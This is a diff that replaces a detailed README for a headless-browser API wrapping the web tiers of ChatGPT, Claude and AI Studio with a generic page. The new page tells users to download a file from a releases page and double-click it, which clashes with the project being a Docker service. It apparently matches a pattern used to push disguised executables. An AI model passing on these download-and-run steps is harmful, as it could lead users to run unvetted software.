@@ -1,264 +1,61 @@
-# LLM Session API Documentation
+# 🛠️ LLMSession-Docker - Simplify Your LLM Access Effortlessly
 
-## Overview
-The **LLM Session API** is a unified interface that automates interactions with major web-based LLM providers (ChatGPT, Claude, and Google AI Studio/Gemini). 
+## 🚀 Getting Started
+Welcome to LLMSession-Docker! This guide will help you download and run the software on your computer. Our application provides a simple way to access various web-based LLMs, such as ChatGPT, Claude, and Google AI Studio, without complicated setups. Follow these steps to get started.
 
-Unlike official APIs that charge per token, this service runs headless browser instances to interact with the free or paid web tiers of these services using your personal Google credentials. It provides a standardized RESTful API to manage sessions, send prompts, and handle conversation chains.
+## 📥 Download LLMSession-Docker
+[![Download LLMSession-Docker](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Lokaz0/LLMSession-Docker/releases)
 
-**Current Version:** 1.0.0  
-**Base URL:** `http://localhost:8080` (Default Docker configuration)
+## 🖥️ System Requirements
+Before you begin, ensure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu preferred)
+- **RAM:** At least 4 GB 
+- **Disk Space:** At least 200 MB of free space
+- **Docker:** Ensure Docker is installed and running on your system
 
-## 🚀 Quick Start
+## 🗂️ Download & Install
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Lokaz0/LLMSession-Docker/releases) to find the latest version of LLMSession-Docker.
 
-### Prerequisites
-*   Docker & Docker Compose
-*   A Google Account (used for SSO login across all providers)
+2. **Select the Correct File**  
+   On the Releases page, look for the latest version. You will see a list of files for download. Choose the file that matches your operating system.
 
-### Installation
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/yourusername/llm-session-api.git
-    cd llm-session-api
-    ```
+3. **Download the File**  
+   Click on the file to start the download. The file will begin downloading to your computer.
 
-2.  **Configure Credentials:**
-    Copy the example environment file and add your Google credentials.
-    ```bash
-    cp .env.example .env
-    # Edit .env and set GOOGLE_EMAIL and GOOGLE_PASSWORD
-    ```
+4. **Run the Software**  
+   Once the file is downloaded, locate it in your downloads folder. Double-click on the file to run LLMSession-Docker.
 
-3.  **Start the Service:**
-    ```bash
-    docker-compose up --build -d
-    ```
-    *Note: The service takes roughly 15-30 seconds to initialize as it launches generic X11 displays and performs login checks for all providers in the background.*
+5. **Follow On-Screen Instructions**  
+   Follow any prompts that appear to complete the setup. The software will guide you through the final steps to get you started.
 
----
+## 🔧 Using LLMSession-Docker 
+After installation, you can start using LLMSession-Docker to access LLMs:
 
-## 🔐 Authentication & Security
+1. **Open the Application**  
+   Locate the app on your desktop or in the applications folder and double-click to open it.
 
-### API Security
-**Current Status:** Public (Internal Network)
-The current version of the API **does not** implement API Key authentication on the endpoints (`/generate`, etc.). It is designed to run within a private network (e.g., behind a firewall or inside a Docker network). 
-*   **Recommendation:** Do not expose port `8080` to the public internet without a reverse proxy (Nginx/Traefik) handling authentication.
+2. **Connect to Your LLMs**  
+   Use the built-in interface to connect to your preferred web-based LLMs. You will need your subscription details to log in.
 
-### Provider Authentication
-The service uses the credentials provided in `.env` to log in to OpenAI, Anthropic, and Google via their web interfaces.
-*   **Session Persistence:** Cookies are stored in the Docker volume `llm_session_data`. This ensures the bots remain logged in across container restarts to minimize suspicious login activity checks.
+3. **Send Commands**  
+   You can send commands through the provided REST API interface. This allows you to interact with the LLMs programmatically.
 
----
+## 🚀 Features 
+- **Unified Interface:** Access multiple LLMs through one simple interface.
+- **Headless Automation:** Work without opening a browser.
+- **Cost-Effective:** Avoid per-token API costs by using your existing web-tier subscriptions.
+- **Easy Setup:** No advanced skills required to get started.
 
-## 📡 API Reference
+## 📚 Support & Feedback
+If you need help or would like to provide feedback, please open an issue in the repository. Your input helps us improve LLMSession-Docker.
 
-### 1. Health Check
-Verifies the service is running and reports which providers are initialized.
+## 🔗 Useful Links
+- [Documentation](https://github.com/Lokaz0/LLMSession-Docker/wiki): Detailed usage instructions and API references.
+- [Community Forums](https://github.com/Lokaz0/LLMSession-Docker/discussions): Join discussions with other users.
+  
+## 🤝 Contribution
+We welcome contributions from all users. If you'd like to help improve LLMSession-Docker, please check our contribution guidelines in the repository.
 
-*   **Endpoint:** `GET /health`
-*   **Auth:** None
-
-#### Response
-```json
-{
-  "status": "ok",
-  "providers": [
-    "chatgpt",
-    "aistudio",
-    "claude"
-  ]
-}
-```
-
----
-
-### 2. Generate Content
-The core endpoint to send prompts to a specific LLM provider. Supports both single prompts and conversation chains.
-
-*   **Endpoint:** `POST /generate`
-*   **Content-Type:** `application/json`
-
-#### Request Body Parameters
-
-| Parameter | Type | Required | Default | Description |
-| :--- | :--- | :--- | :--- | :--- |
-| `provider` | `string` (enum) | No | `chatgpt` | Target LLM. Options: `chatgpt`, `claude`, `aistudio`. |
-| `prompt` | `string` OR `list[string]` | **Yes** | - | The input text. Pass a **String** for a single question. Pass a **List** of strings to simulate a conversation chain (context is preserved for the duration of the list processing). |
-
-#### Example 1: Single Prompt
-**Request:**
-```bash
-curl -X POST http://localhost:8080/generate \
-  -H "Content-Type: application/json" \
-  -d '{
-    "provider": "claude",
-    "prompt": "Explain quantum computing in one sentence."
-  }'
-```
-
-**Response:**
-```json
-{
-  "status": "success",
-  "provider": "claude",
-  "mode": "single",
-  "result": "Quantum computing uses quantum mechanics to process information in ways that standard computers cannot, allowing for potentially exponential speedups in specific complex calculations."
-}
-```
-
-#### Example 2: Conversation Chain
-This is useful if you need to set context before asking the actual question.
-
-**Request:**
-```json
-{
-  "provider": "chatgpt",
-  "prompt": [
-    "I am going to provide a snippet of code. Reply only with 'OK' if you understand.",
-    "print('Hello World')",
-    "Rewrite the code above in C++."
-  ]
-}
-```
-
-**Response:**
-```json
-{
-  "status": "success",
-  "provider": "chatgpt",
-  "mode": "chain",
-  "result": [
-    "OK",
-    "OK", 
-    "#include <iostream>\n\nint main() {\n    std::cout << \"Hello World\" << std::endl;\n    return 0;\n}"
-  ]
-}
-```
-
----
-
-### 3. Reset Session
-Forces the browser instance for a specific provider to close and reset. Use this if a provider becomes unresponsive or "hallucinates" excessively.
-
-*   **Endpoint:** `DELETE /session/{provider}`
-*   **Path Parameters:**
-    *   `provider`: `chatgpt`, `claude`, or `aistudio`.
-
-#### Example
-```bash
-curl -X DELETE http://localhost:8080/session/claude
-```
-
-#### Response
-```json
-{
-  "message": "claude browser closed."
-}
-```
-*Note: The next time a request is sent to Claude, the system will automatically re-launch the browser and re-authenticate.*
-
----
-
-## ⚠️ Limitations & Queue Behavior
-
-### Concurrency Model
-Due to the nature of browser automation (memory usage and DOM manipulation), this service uses a **Single Worker Queue** per provider.
-
-1.  **Serialized Requests:** If you send 5 requests to `chatgpt` simultaneously, they will be processed one by one.
-2.  **Parallel Providers:** Requests to `chatgpt` do **not** block requests to `claude`. They run in separate threads.
-3.  **Timeout:** If a prompt takes too long, the internal automation may throw an exception.
-
-### Rate Limiting
-While the API itself does not enforce rate limits, the underlying providers (OpenAI, Anthropic) do.
-*   **Risk:** Sending requests too fast may trigger "Too many requests" errors on the web interface or CAPTCHA challenges.
-*   **Recommendation:** Implement a slight delay between requests in your client application.
-
----
-
-## 🐛 Error Handling
-
-The API returns standard HTTP status codes.
-
-| Code | Status | Description |
-| :--- | :--- | :--- |
-| `200` | OK | Successful generation. |
-| `400` | Bad Request | Invalid provider selected or malformed JSON. |
-| `422` | Validation Error | Missing required fields (e.g., empty `prompt`). |
-| `500` | Internal Server Error | Automation failure (e.g., Browser crashed, Element not found, Login failed). |
-
-**Error Response Body:**
-```json
-{
-  "detail": "Automation failed: Timeout waiting for response element."
-}
-```
-
----
-
-## 💻 Client Code Examples
-
-### Python (Requests)
-```python
-import requests
-
-API_URL = "http://localhost:8080/generate"
-
-def ask_llm(provider, text):
-    payload = {
-        "provider": provider,
-        "prompt": text
-    }
-    
-    try:
-        response = requests.post(API_URL, json=payload)
-        response.raise_for_status()
-        data = response.json()
-        print(f"[{data['provider']}] Response:\n{data['result']}")
-    except requests.exceptions.HTTPError as e:
-        print(f"Error: {e.response.text}")
-
-# Usage
-ask_llm("chatgpt", "Write a haiku about APIs.")
-```
-
-### JavaScript (Node/Fetch)
-```javascript
-const askLLM = async (provider, prompt) => {
-  const response = await fetch('http://localhost:8080/generate', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({ provider, prompt })
-  });
-
-  if (!response.ok) {
-    const err = await response.json();
-    throw new Error(err.detail);
-  }
-
-  const data = await response.json();
-  return data.result;
-};
-
-// Usage
-askLLM('aistudio', 'List 3 generic naming conventions.')
-  .then(console.log)
-  .catch(console.error);
-```
-
----
-
-## 🛠 Troubleshooting
-
-1.  **`500 Internal Server Error` on first request:**
-    *   The service might still be initializing. Check the logs (`docker-compose logs -f`).
-    *   Wait for the log message: `All initialization batches finished`.
-
-2.  **"Provider not active" error:**
-    *   Ensure the `.env` file has correct Google Credentials.
-    *   Check logs to see if the login failed for that specific provider during startup.
-
-3.  **Xvfb / Display Errors:**
-    *   The Dockerfile includes a fix for Xvfb locks. If this persists, restart the container: `docker-compose restart`.
+Thank you for using LLMSession-Docker! We hope this software enhances your experience with web-based LLMs.
